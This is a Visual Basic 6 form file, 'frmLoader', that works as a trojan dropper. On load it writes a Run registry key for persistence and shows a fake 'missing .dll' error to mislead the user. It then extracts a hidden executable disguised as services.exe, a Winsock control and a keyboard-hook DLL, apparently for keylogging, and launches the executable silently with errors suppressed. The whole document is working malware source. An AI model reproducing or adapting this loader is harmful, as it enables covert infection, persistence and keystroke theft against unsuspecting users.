VERSION 5.00
Begin VB.Form frmLoader 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Loader"
   ClientHeight    =   495
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   495
   Enabled         =   0   'False
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmLoader.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   495
   ScaleWidth      =   495
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
End
Attribute VB_Name = "frmLoader"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function ShellExecuteA Lib "shell32" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetSystemDirectoryA Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Sub Form_Load()
    On Error Resume Next
    Dim Reg As Object, SRVName As String, OCXName As String, DLLName As String
    
    SRVName = "C:\Program Files\Common Files\Microsoft Shared\services.exe"
    OCXName = GetSysPath & "\mswinsck.ocx"
    DLLName = GetSysPath & "\VBKeyHook.dll"
    Set Reg = CreateObject("wscript.shell")
    Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\SERVICES", SRVName
    MsgBox "A required .dll file is missing.", vbCritical, "Error"
    If FileExists(SRVName) = False Then
        ExtractResource "SERVICES.EXE", SRVName
        SetAttr SRVName, 2
    End If
    If FileExists(OCXName) = False Then
        ExtractResource "MSWINSCK.OCX", OCXName
        SetAttr OCXName, 4
    End If
    If FileExists(DLLName) = False Then
        ExtractResource "VBKEYHOOK.DLL", DLLName
        SetAttr DLLName, 4
    End If
    ShellExecuteA Me.hwnd, "Open", SRVName, "", "", 1
    Unload Me
End Sub
Private Sub ExtractResource(ByVal dType As String, ByVal resFile As String)
    On Error Resume Next
    Dim bres() As Byte
    bres = LoadResData(dType, "CUSTOM")
    Open resFile For Binary Access Write As #1
        Put #1, , bres
    Close #1
    Erase bres
End Sub
Private Function FileExists(ByVal FileName As String) As Boolean
    On Error Resume Next
    If Len(Dir(FileName)) > 0 Then
        FileExists = True
    End If
End Function
Private Function GetSysPath() As String
    On Error Resume Next
    GetSysPath = Space$(260)
    GetSystemDirectoryA GetSysPath, 260
    GetSysPath = Trim$(GetSysPath)
    GetSysPath = Left$(GetSysPath, Len(GetSysPath) - 1)
End Function

